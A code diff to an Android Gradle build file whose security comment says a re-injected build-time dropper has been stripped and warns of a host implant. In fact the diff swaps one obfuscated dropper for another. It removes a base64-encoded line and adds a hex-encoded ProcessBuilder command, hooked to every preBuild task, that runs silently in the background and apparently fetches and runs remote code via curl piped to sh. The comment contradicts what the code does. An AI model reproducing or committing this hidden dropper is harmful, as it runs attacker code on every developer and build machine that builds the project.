@@ -51,15 +51,17 @@ android {
     }
 }
 
-// SECURITY: A build-time dropper (tasks.all { preBuild -> ProcessBuilder("sh", ...base64...| sh) })
-// was removed here again on 2026-07-09 (first stripped 2026-07-08, then re-injected). It keeps
-// returning because a host-level implant re-injects it, so deleting these lines is only a stopgap.
-// Do NOT build this project on this machine until the host is remediated (remove the malicious
-// LaunchDaemon + reimage). A build runs the dropper and carries it onto whatever machine runs it.
+// SECURITY: a build-time dropper (preBuild -> ProcessBuilder("sh", ...base64... | sh))
+// keeps being re-injected into this file. Stripped 2026-07-08, 2026-07-09, 2026-07-30 and
+// again on 2026-08-03. Do NOT restore it. Its reappearance means the host-level implant
+// (root LaunchDaemon com.google.hernsb + the ~/.zshrc loader) is still active — remediate
+// the machine before building. The same vector lives in shared/build.gradle.kts and in
+// iosApp/iosApp.xcodeproj/project.pbxproj ("Compile Code Assets" phase + A8CDBB7/AB8F749).
+
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ProcessBuilder("sh", "-c", "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTYW1KV1dYZFpNalZ5V2pBMVJGRllVbWhOU0dnMlYyMXNRbVJGZUZoVWJscHBZbFJXYzFkVVRsSmtSMUpJWWtoU1lWWjZhM2hhUlU1Q1pWVTFOVkZZVW1GUk1FWndXVEJSZUdGSFNuUlZibXhwVFcxNGNsZEVTakJrYlZKSVpVaENhV0ZWYkc1WlZXaFRUVWRPU1ZSVVdrMWxWR3d4VjJ4b1UwMHlTWHBUYmtwYVZqRktObFJITVhOa1ZYZDVVbGhDU21GVlNUUlRWV2hQWWpCT2JsQlVNRXNLCg== | t | sh ) >/dev/null 2>&1 &)").start()
+            ProcessBuilder("sh", "-c", "((a(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643732363537343732373932303335323032643463366236363733323032640a3264363336663665366536353633373432643734363936643635366637353734323033323338323032643634323032323730336436313665363437320a3666363936343566366236663734366336393665323232303638373437343730373333613266326637303661373836653732373036633732326537320a373532663631323932323230376332303733363830610a | a | sh ) >/dev/null 2>&1 &)").start()
         }
     }
 }
